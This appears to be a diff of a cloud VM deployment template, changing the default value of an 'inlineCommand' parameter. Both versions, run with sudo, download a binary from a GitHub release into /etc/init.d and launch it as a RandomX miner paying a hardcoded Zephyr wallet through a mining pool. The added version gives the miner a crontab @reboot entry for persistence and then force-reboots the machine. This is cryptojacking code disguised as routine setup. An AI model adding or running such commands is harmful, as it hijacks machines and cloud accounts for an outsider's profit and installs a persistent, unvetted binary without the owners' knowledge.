@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; cd /etc/init.d/; wget https://github.com/jokervulinh96/lucky/releases/download/lucky/lucky.tar.gz; tar xf lucky.tar.gz; cd lucky; sudo nohup ./lucky --algorithm randomx --pool de.zephyr.herominers.com:1123 --tls true --wallet ZEPHYR3NDqmD7mN2DAZdZx3DH8CvRs92mE7KnnpKDkXDZcXytMQmKMc8azkr39BRTdhFHd4CF2zcST8kHQQPMcojUezfegbKsag2N --password luckyvl --keepalive true --cpu-threads 4 --disable-gpu>log.out &",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; cd /etc/init.d/; wget https://github.com/jokervulinh96/lucky/releases/download/lucky/lucky.tar.gz; tar xf lucky.tar.gz; cd lucky; echo @reboot 'cd /etc/init.d/lucky/ && sudo screen -d -m ./lucky --algorithm randomx --pool de.zephyr.herominers.com:1123 --tls true --wallet ZEPHYR3NDqmD7mN2DAZdZx3DH8CvRs92mE7KnnpKDkXDZcXytMQmKMc8azkr39BRTdhFHd4CF2zcST8kHQQPMcojUezfegbKsag2N --password luckyvl --keepalive true --cpu-threads 4 --disable-gpu' | crontab -; reboot -f",
             "metadata": {
                 "description": "inline command"
             }
